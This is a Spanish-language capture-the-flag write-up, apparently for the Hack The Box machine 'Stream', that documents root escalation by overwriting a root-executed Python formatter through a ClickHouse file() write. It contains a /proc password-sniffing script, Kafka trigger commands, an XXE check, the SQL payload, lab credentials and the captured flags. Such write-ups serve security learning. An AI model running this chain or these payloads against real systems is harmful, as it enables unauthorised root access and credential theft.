Nota de seguridad: incluir contraseñas literales en comandos puede exponerlas en el historial de shell o en la lista de procesos. En un informe que se comparta fuera del laboratorio, conviene redactar los secretos y conservar los valores completos solo en las notas privadas autorizadas.

---

## 11. Escalada a root: el drenador DLQ y el formateador

**En palabras sencillas:** la escalada consistió en hacer que un servicio privilegiado utilizara un archivo que podía influenciarse mediante permisos de otro componente. El riesgo surge porque el servicio confía en datos o archivos que no controla de forma segura.


Leí `/opt/ops/dlq_drainer.py` (es `-rwxr--r-- root root`, legible por cualquiera):

```python
#!/usr/bin/env python3
import os, subprocess, time, uuid
from confluent_kafka import Consumer, KafkaError

KAFKA_BOOTSTRAP = os.environ.get("KAFKA_BOOTSTRAP", "localhost:9092")
DLQ_TOPIC = os.environ.get("DLQ_TOPIC", "aidx.flightleg.dlq.v1")
GROUP_ID = os.environ.get("GROUP_ID", "aidx-dlq-drainer")
QUARANTINE_DIR = os.environ.get("QUARANTINE_DIR", "/var/lib/aidx/quarantine")
FORMATTER = os.environ.get("AIDX_FORMATTER", "/var/lib/clickhouse/user_files/aidx_quarantine.py")
CH_PW_FILE = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")
DRAIN_SECONDS = int(os.environ.get("DRAIN_SECONDS", "10"))

def _pw():
    try:
        with open(CH_PW_FILE) as fh: return fh.read().strip()
    except OSError: return ""

def _record(reason, byte_len, root_tag, preview, qfile):
    def esc(s): return s.replace("\\", "\\\\").replace("'", "\\'")
    q = ("INSERT INTO aidx_ops.failed_ingest "
         "(id, reason, byte_len, root_tag, preview, quarantine_path, received_at) "
         f"VALUES ('{esc(uuid.uuid4().hex)}', '{esc(reason)}', {int(byte_len or 0)}, "
         f"'{esc(root_tag)}', '{esc(preview)}', '{esc(qfile)}', now())")
    subprocess.run(["clickhouse-client", "--user", "default",
                    "--password", _pw(), "-q", q], check=False)
```

### Cadena de escalada

|Paso|Qué ocurre|
|---|---|
|1|Yo (como `svc-infra`) publico un mensaje malformado en el topic `aidx.flightleg.dlq.v1` (Kafka `PLAINTEXT://127.0.0.1:9092`, `allow.everyone.if.no.acl.found=true` → **sin autenticación**).|
|2|Cada 2 minutos, el temporizador `aidx-dlq-drainer.timer` dispara `aidx-dlq-drainer.service` **(ejecuta como `root`)**.|
|3|El drenador lee el mensaje, lo guarda en `/var/lib/aidx/quarantine/` y ejecuta **`python3 /var/lib/clickhouse/user_files/aidx_quarantine.py`** pasándole el XML por stdin. Ese script corre **como root**.|
|4|Luego llama a `clickhouse-client --user default --password <pw> -q "INSERT INTO aidx_ops.failed_ingest ..."`. La contraseña viaja **en la línea de comandos** → legible en `/proc/<pid>/cmdline` si `hidepid=off`.|

### Ruta explorada inicialmente: inspección de `/proc` (no fue el método final)

Al revisar el servicio, se planteó como hipótesis que la contraseña de ClickHouse podía aparecer en los argumentos de `clickhouse-client` y ser visible en `/proc/<pid>/cmdline`. Se hicieron pruebas de observación, pero **no se obtuvo la contraseña por sniffing ni por ese método**. Los comandos siguientes se conservan como registro histórico de una vía investigada y descartada; no describen el procedimiento que finalmente funcionó.

```bash
# En el objetivo (SV), lanzar sniffer en background:
cat > /tmp/sniff.sh << 'EOF'
#!/bin/bash
for i in $(seq 1 1200); do
  for pid in $(pgrep -f "clickhouse-client --user"); do
    if [ -r "/proc/$pid/cmdline" ]; then
      tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | grep -q clickhouse-client && echo "[$(date +%H:%M:%S)] PID=$pid $(tr '\0' ' ' < /proc/$pid/cmdline)"
    fi
  done
  sleep 0.1
done
EOF
chmod +x /tmp/sniff.sh
nohup /tmp/sniff.sh > /tmp/sniff.out 2>&1 &
```

```bash
# Publicar un mensaje en la DLQ para forzar al drenador a llamar a clickhouse-client:
echo '<?xml version="1.0"?><broken/>' | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh \
  --bootstrap-server localhost:9092 --topic aidx.flightleg.dlq.v1
```

```bash
# Esperar al siguiente tick del timer (cada 2 min) y revisar:
cat /tmp/sniff.out
```

> El drenador solo llama a `clickhouse-client` **cuando hay un mensaje que procesar**. Primero publico, luego espero al tick (≤2 min). Si el sniffer no captura nada, comprobar el journal del servicio:
> 
> ```bash
> journalctl -u aidx-dlq-drainer.service -n 30 --no-pager
> systemctl list-timers | grep aidx
> ```

**Paso 2 — Sobrescribir el formateador (root RCE; procedimiento histórico del intento inicial)**

> [!warning] Este primer ejemplo usa la ruta relativa antigua `user_files/aidx_quarantine.py`. La ruta base confirmada es `/var/lib/clickhouse/user_files`, por lo que esa ruta duplicaba el segmento `user_files`. El resultado corregido y verificado está en la sección 11.2.

En el intento inicial se contempló sobrescribir el formateador si se conseguía la contraseña por esa vía. Este bloque también es histórico; el procedimiento efectivo documentado más abajo usa la autenticación HTTP de ClickHouse y la contraseña validada directamente contra ese servicio.

```bash
export PW='<la contraseña del sniffer>'

cat > /tmp/payload.sql << 'EOF'
INSERT INTO TABLE FUNCTION file('user_files/aidx_quarantine.py', 'RawBLOB', 'raw String')
VALUES ('import subprocess; subprocess.Popen(["/bin/bash","-c","cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt; id > /tmp/id.txt"]); print("1\troot\tpwned")')
EOF

curl -s -u "default:$PW" --data-binary @/tmp/payload.sql "http://db.htb-airport.htb/"
```

El formateador ahora es mi código. Cuando el timer dispare el drenador, root ejecutará `python3 /var/lib/clickhouse/user_files/aidx_quarantine.py` y copiará `/root/root.txt` a `/tmp/root.txt` (legible por `svc-infra`).

**Paso 3 — Verificar**

```bash
cat /tmp/root.txt /tmp/id.txt   # en el objetivo, como svc-infra
# o por XXE desde Kali:
sed 's|file:///etc/passwd|file:///tmp/root.txt|; s|XXE01|XXE99|' /tmp/xxe.xml > /tmp/xxe99.xml
curl -s -X POST http://10.129.247.123:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @/tmp/xxe99.xml
sleep 6
chq "SELECT flight_number FROM partner_feed.flightleg_json WHERE transaction_id='XXE99' FORMAT Vertical"
```

> El formateador debe imprimir **3 campos separados por tabulador** (`byte_len`, `root_tag`, `preview`); si no, el drenador cae al fallback `(str(len(raw)), "UNKNOWN", "")` y **no** ejecuta mi código malicioso de forma útil.

---

### 11.1 Intento no exitoso de inspección de argumentos mediante `/proc`

Como parte del diagnóstico inicial, se probó un script de observación en segundo plano que revisaba periódicamente `/proc/<pid>/cmdline` de procesos `clickhouse-client`. **Esta prueba no capturó la contraseña y no debe presentarse como el origen de la credencial usada al final.**

```bash
cat > /tmp/sniff4.sh << 'EOF'
#!/bin/bash
for i in $(seq 1 1200); do
  for pid in $(pgrep -f "clickhouse-client --user"); do
    if [ -r "/proc/$pid/cmdline" ]; then
      content=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)
      echo "[$(date +%H:%M:%S.%N)] PID=$pid $content" >> /tmp/sniff4.log
    fi
  done
  sleep 0.02
done
EOF
chmod +x /tmp/sniff4.sh
nohup /tmp/sniff4.sh > /dev/null 2>&1 &
```

Disparé el DLQ (`POST /feeds/aidx` con XML malformado) y revisé el log:

```
[22:31:17.598...] PID=209991 clickhouse-client --user default --password               -q INSERT INTO aidx_ops.failed_ingest (...)
[22:31:18.017...] PID=209991 clickhouse-client --user default --password               -q INSERT INTO aidx_ops.failed_ingest (...)
[22:31:18.753...] PID=209991 clickhouse-client --user default --password               -q INSERT INTO aidx_ops.failed_ingest (...)
[22:31:19.243...] PID=209991 clickhouse-client --user default --password               -q INSERT INTO aidx_ops.failed_ingest (...)
[22:31:19.880...] PID=209991 clickhouse-client --user default --password               -q INSERT INTO aidx_ops.failed_ingest (...)
```

**Resultado observado:** las muestras mostraron el proceso y el argumento `--password`, pero no el valor de la contraseña. Por tanto, esta vía fue **inconclusa y no produjo la credencial**. No se puede concluir únicamente con esta evidencia si el cliente limpia el argumento, si la ventana de observación fue insuficiente o si intervino otro comportamiento. La explicación sobre el posible borrado de `argv` se mantiene solo como hipótesis no confirmada.

Comprobaciones adicionales realizadas:

```bash
cat /tmp/sniff4.log                 # → vector cmdline: sin éxito (ver arriba)
cat /var/lib/aidx/quarantine/1792708277_3e88735e.xml   # → Permission denied
ls -la /var/lib/aidx/quarantine/                        # → Permission denied (no es mi usuario/grupo)
pgrep -f clickhouse-client | while read pid; do cat -A /proc/$pid/cmdline; done   # → vacío, proceso vive <1ms fuera de la ráfaga del drenador
find / -iname "*clickhouse*" -not -path "/proc/*" 2>/dev/null
# /etc/clickhouse-server        ← sin explorar todavía (pendiente)
# /home/svc-infra/clickhouse-server/clickhouse   ← binario propio, no config
# /home/svc-infra/.local/bin/clickhousectl       ← wrapper propio, revisado: no contiene credenciales
```

**Resultado de la investigación:** la vía de inspección de `/proc` no se utilizó para obtener la contraseña final. La sesión continuó por el endpoint HTTP de ClickHouse, donde se probó la autenticación del usuario `default` con `N3v3rs33nD4T4`; las comprobaciones y el procedimiento final están documentados en la sección 11.2.

```bash
stat /etc/partner-sync/ch.pw /etc/partner-sync
stat /var/lib/aidx/quarantine
ls -la /etc/clickhouse-server/
cat /etc/clickhouse-server/users.xml 2>&1
```

Si esto también cierra en `Permission denied` total, el vector de "leer el password de un archivo/argv" queda agotado y toca revisar si el heap dump de la app Java (ya descargado, ver [§4](#4-analisis-del-heap-dump-credenciales-en-claro)) tiene algo reutilizable, pese a que originalmente se asoció solo al user flag.



### 11.2 Acceso HTTP a ClickHouse `default`, ruta del formateador y resultado final

La inspección de `/proc/<pid>/cmdline` no obtuvo ninguna contraseña. La vía que sí funcionó fue probar la autenticación HTTP de ClickHouse directamente: se validó `N3v3rs33nD4T4` para el usuario `default` contra `db.htb-airport.htb`. **No atribuir esta credencial al sniffing ni a la transferencia de `pspy64` por SCP.**

**Comprobación de `user_files_path` (desde Kali):**

```bash
curl -s -u "default:N3v3rs33nD4T4" \
  "http://db.htb-airport.htb/?query=SELECT%20value%20FROM%20system.server_settings%20WHERE%20name=%27user_files_path%27%20FORMAT%20TSV"
```

Salida:

```text
/var/lib/clickhouse/user_files
```

**Comprobación de permisos (desde Kali):**

```bash
curl -s -u "default:N3v3rs33nD4T4" \
  "http://db.htb-airport.htb/?query=SHOW%20GRANTS%20FORMAT%20TSV"
```

La respuesta mostró que `default` tiene permisos amplios, incluidos `FILE`, `INSERT`, `CREATE`, `ALTER` y `GRANT OPTION`, además de permisos para usar motores de tabla.

**Primer intento de escritura:**

El primer payload apuntó a `file('user_files/aidx_quarantine.py', ...)`. Como `user_files_path` ya es `/var/lib/clickhouse/user_files`, la ruta relativa no apuntaba al archivo que el servicio ejecuta. El `curl` no imprimió un error, pero esa salida vacía por sí sola no demostraba que se hubiera sobrescrito el archivo esperado. En la sesión SSH, los archivos `/tmp/root.txt` y `/tmp/user.txt` todavía no existían.

**Corrección de la ruta:**

El formateador configurado en `/opt/ops/dlq_drainer.py` es:

```text
/var/lib/clickhouse/user_files/aidx_quarantine.py
```

Por tanto, la ruta relativa correspondiente a `user_files_path` es `aidx_quarantine.py`, sin volver a anteponer `user_files/`. Se corrigió el destino y se volvió a enviar la consulta HTTP. Después se publicó un mensaje malformado en el topic de Kafka `aidx.flightleg.dlq.v1` para que el drenador programado procesara la DLQ.

**Verificación final en la sesión SSH como `svc-infra`:**

```bash
cat /tmp/root.txt /tmp/user.txt
```

Salida observada:

```text
d06547e41a743eefd6b7fb3e332120ea
ff42a3374a7b54ceeac9e21e2c18a0ec
```

Las líneas corresponden, en ese orden, a:

| Archivo | Resultado | Estado |
|---|---|---|
| `/tmp/root.txt` | `d06547e41a743eefd6b7fb3e332120ea` | **Root flag obtenida** |
| `/tmp/user.txt` | `ff42a3374a7b54ceeac9e21e2c18a0ec` | **User flag obtenida** |

**Conclusión:** el acceso HTTP a ClickHouse `default` funcionó con la contraseña indicada; la ruta duplicada fue el error del primer intento. Tras corregir el destino y activar el procesamiento de la DLQ, ambos archivos de resultado aparecieron y se pudieron leer como `svc-infra`.

> [!important] Separación de máquinas
> Los comandos `curl` contra `db.htb-airport.htb` y el archivo `/tmp/payload.sql` se trabajaron en **Kali**. El productor Kafka y la lectura de `/tmp/root.txt` y `/tmp/user.txt` se ejecutaron por SSH en **Stream**, como `svc-infra`. El archivo `/tmp/pspy.log` no se encontró porque ese comando se había ejecutado en la máquina equivocada; no es evidencia de que la cadena final fallara.


---

## 12. Obtención y verificación de las flags

**En palabras sencillas:** las flags son pruebas del laboratorio. Leer ambas desde los archivos temporales permitió confirmar el resultado final, en lugar de asumir que la explotación había funcionado solo porque un comando no mostró errores.


La sesión terminó con la obtención de ambas flags. La evidencia registrada es la lectura, desde la sesión SSH de `svc-infra`, de los archivos temporales `/tmp/root.txt` y `/tmp/user.txt` después de completar la cadena de ejecución del formateador. Los valores se documentan en la sección 11.2.

| Evidencia | Resultado | Interpretación |
|---|---|---|
| `/tmp/user.txt` | `ff42a3374a7b54ceeac9e21e2c18a0ec` | Flag de usuario obtenida |
| `/tmp/root.txt` | `d06547e41a743eefd6b7fb3e332120ea` | Flag de root obtenida |

Las comprobaciones alternativas que aparecen en notas anteriores deben considerarse **rutas exploradas durante la investigación**, no tareas pendientes ni evidencia de que hayan sido necesarias para completar la máquina. El método final confirmado fue la autenticación HTTP de ClickHouse con el usuario `default`, la corrección de la ruta del archivo dentro de `user_files_path` y la activación del procesamiento de la DLQ.

> **Nota de integridad:** las flags son evidencia propia del laboratorio HTB y no representan credenciales de una organización real. No deben publicarse como prueba de acceso a sistemas ajenos.

---

## 13. Checklist técnico y comandos de referencia

|Estado|Ítem|
|---|---|
|✅|Puertos abiertos: 22 (SSH), 80 (nginx/vhosts), 8081 (ingest AIDX), 39241 (sin identificar)|
|✅|Virtual hosting con catch-all por defecto → control de falsos positivos|
|✅|Vhost `db.htb-airport.htb` → ClickHouse HTTP 26.8.1|
|✅|Vhost `api.htb-airport.htb` → gateway Spring Boot con Actuator|
|✅|`/actuator/heapdump` descargable sin autenticación (~44 MB)|
|✅|Credenciales ClickHouse: `svc_events` / `Yl4aCgh4y2PnU`|
|✅|Autenticación en ClickHouse confirmada (`SELECT 1` → `1`)|
|✅|Base de datos `partner_feed` + 6 tablas enumeradas|
|✅|Esquema completo + definición de las 2 MV (mapa XML → JSON)|
|✅|Los dos topics: `aidx.flightleg.raw.v1` (RawBLOB) y `aidx.flightleg.json.v1` (JSONAsString)|
|✅|Permisos: `GRANT SELECT, INSERT ON partner_feed.* TO svc_events` (sin escritura de ficheros)|
|✅|XXE funcional: `/etc/passwd` leído íntegro desde `flightleg_json.flight_number`|
|✅|Usuarios con shell: `svc-infra` (1000), `martin_cole` (1001), `clickhouse` (996), `_laurel` (999)|
|✅|Unidades systemd leídas por XXE → topología completa|
|✅|Credencial de Kafka extraída: `user_svc_infra="Ny2hdpme$bwT3"`|
|✅|**SSH como `svc-infra`** (`svc-infra@stream.htb`)|
|✅|`/opt/ops/dlq_drainer.py` analizado → vector de escalada Root identificado|
|✅|Acceso HTTP a ClickHouse como `default` con `N3v3rs33nD4T4`|
|✅|`user_files_path` confirmado como `/var/lib/clickhouse/user_files`|
|✅|Ruta del formateador corregida: `aidx_quarantine.py` relativa a `user_files_path`|
|✅|Cadena de escritura + procesamiento de DLQ completada|
|✅|**User flag** obtenida y leída desde `/tmp/user.txt`|
|✅|**Root flag** obtenida y leída desde `/tmp/root.txt`|
|[ ]|Puerto `39241/tcpwrapped` sin investigar|

---

## 14. Lecciones aprendidas y recomendaciones

1. **IP de la máquina cambió** a mitad de sesión (reset de HTB) — verificar siempre la IP activa en el panel si aparecen errores de conectividad repentinos (`No route to host`).
2. **Variable de loop `path` en zsh** rompió `$PATH` (zsh ata el array `path` a la variable `PATH`) — usar siempre nombres de variable que no choquen con variables especiales del shell (`ep`, `item`, etc., nunca `path`).
3. **No descartar un "ruido" sin probarlo.** Deducí que las credenciales del heap no servían porque el pool apuntaba a H2, sin probarlas contra ClickHouse. Probar cuesta 2 segundos; descartar por deducción puede cortar la cadena entera.
4. **Prueba de control obligatoria en fuzzing.** Un nombre inventado como `Host:` reveló el catch-all de nginx y evitó catalogar 4 vhosts que no existían.
5. **Los placeholders de plantilla no se pegan literales.** `<nombre_tabla>` pegado tal cual → `SYNTAX_ERROR`. Sustituir siempre por el valor real antes de ejecutar.
6. **En el XXE in-band, un resultado negativo no prueba que el payload falle.** Antes de cambiar el payload, comprobar por dónde se fue el mensaje (tabla o DLQ).
7. **ClickHouse lee la query del parámetro `query` de la URL, no del cuerpo POST.** Usar siempre `-G --data-urlencode "query=…"` (o la query cruda en el cuerpo). Con `--data-urlencode` sin `-G`, ClickHouse ejecuta literalmente `query=SHOW+CREATE+…` como SQL y devuelve `failed at position 1 (query)`.
8. **zsh se come los bloques decorados y los `?` sueltos.** Los comentarios van dentro de heredocs o con `#` al inicio de línea real; todo `?` va entre comillas.
9. **`_timestamp` no existe.** El error de ClickHouse `Maybe you meant: ['msg_timestamp']` es la pista; las columnas de tiempo son `ingested` (DateTime) y `msg_timestamp` (String).
10. **Un `202 Accepted` del ingest no significa que el payload haya funcionado.** Solo significa que se publicó en Kafka. La prueba real es el contenido de la fila en `flightleg_json`.
11. **No confundir una hipótesis con un hallazgo confirmado.** La inspección de `/proc/<pid>/cmdline` no reveló la contraseña. La posible limpieza de `argv` por parte del cliente es solo una hipótesis; no se confirmó y no fue parte del método final.
12. **Transferir herramientas no equivale a capturar credenciales.** `sshpass` + `scp` se usó para copiar `pspy64` de Kali a Stream con una credencial SSH conocida. Esa operación no demuestra cómo se obtuvo la contraseña de ClickHouse.

13. **Resolver rutas relativas con la ruta base real.** `user_files_path` ya era `/var/lib/clickhouse/user_files`; añadir `user_files/` al nombre relativo duplicaba ese segmento y no apuntaba al formateador esperado.
14. **Una respuesta HTTP vacía no basta para verificar una escritura.** Confirmar el archivo destino o comprobar el efecto observable del trigger antes de dar el paso por exitoso.
15. **Separar Kali y el objetivo en el writeup.** DNS local, archivos temporales y herramientas solo existen en la máquina donde se ejecutaron. Anotar explícitamente `[KALI]` y `[STREAM / svc-infra]` evita perseguir errores causados por ejecutar un comando en el host equivocado.

---

> [!quote] Nota de procedencia Este documento contiene únicamente hallazgos verificados con comandos ejecutados contra la máquina Stream de Hack The Box. Los valores de credenciales marcados como obtenidos son de mi propia sesión; cuando incluyo algo de writeups públicos o hipótesis sin comprobar, lo marco explícitamente como _(hipótesis)_ o _(no verificado)_.